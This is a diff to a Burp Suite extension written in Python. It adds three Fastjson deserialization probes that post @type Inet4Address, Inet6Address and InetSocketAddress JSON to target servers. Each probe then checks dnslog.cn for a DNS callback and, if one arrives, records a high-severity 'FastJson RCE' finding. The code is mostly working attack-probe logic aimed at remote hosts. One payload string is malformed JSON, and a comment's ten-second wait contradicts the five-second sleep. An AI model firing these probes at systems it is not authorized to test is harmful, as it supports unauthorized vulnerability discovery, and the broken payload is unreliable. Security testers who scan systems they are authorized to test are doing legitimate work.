@@ -189,10 +189,97 @@ class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory,
             else:
                 print '[-] {}'.format(reqUrl)
 
+        def payloads3():
+            random_str = get_random_str()  # 获取随机值
+            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
+
+
+            payload3 = '{"@type":"java.net.Inet4Address","val":"' + dnslog_random_domain + '"}'
+            newBody = self._helpers.stringToBytes(payload3)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
+            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
+            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
+            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
+            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
+            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
+            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
+
+            time.sleep(5)  # 等十秒再查询，可能会有延迟
+            if records_dnslog(random_str, getrecords_cookie):
+                print '[+] {}'.format(newUrl)
+                self.save(newUrl)
+                self.issues.append(CustomScanIssue(
+                    newIHttpRequestResponse.getHttpService(),
+                    newUrl,
+                    [newIHttpRequestResponse],
+                    "FastJson RCE",
+                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
+                    "High"))
+            else:
+                print '[-] {}'.format(reqUrl)
+
+        def payloads4():
+            random_str = get_random_str()  # 获取随机值
+            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
+
+
+            payload4 = '{"@type":"java.net.Inet6Address","val":"' + dnslog_random_domain + '"}'
+            newBody = self._helpers.stringToBytes(payload4)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
+            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
+            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
+            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
+            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
+            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
+            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
+
+            time.sleep(5)  # 等十秒再查询，可能会有延迟
+            if records_dnslog(random_str, getrecords_cookie):
+                print '[+] {}'.format(newUrl)
+                self.save(newUrl)
+                self.issues.append(CustomScanIssue(
+                    newIHttpRequestResponse.getHttpService(),
+                    newUrl,
+                    [newIHttpRequestResponse],
+                    "FastJson RCE",
+                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
+                    "High"))
+            else:
+                print '[-] {}'.format(reqUrl)
+
+        def payloads5():
+            random_str = get_random_str()  # 获取随机值
+            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
+
+
+            payload5 = '{"@type": "java.net.InetSocketAddress"{"address":, "val":"' + dnslog_random_domain + '"}, "port":80}'
+            newBody = self._helpers.stringToBytes(payload5)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
+            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
+            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
+            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
+            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
+            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
+            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
+
+            time.sleep(5)  # 等十秒再查询，可能会有延迟
+            if records_dnslog(random_str, getrecords_cookie):
+                print '[+] {}'.format(newUrl)
+                self.save(newUrl)
+                self.issues.append(CustomScanIssue(
+                    newIHttpRequestResponse.getHttpService(),
+                    newUrl,
+                    [newIHttpRequestResponse],
+                    "FastJson RCE",
+                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
+                    "High"))
+            else:
+                print '[-] {}'.format(reqUrl)
+
         getrecords_cookie, dnslog_domain = get_dnslog()  # 从dnslog获取域名和cookies
 
         payloads1()
         payloads2()
+        payloads3()
+        payloads4()
+        payloads5()
 
 
 
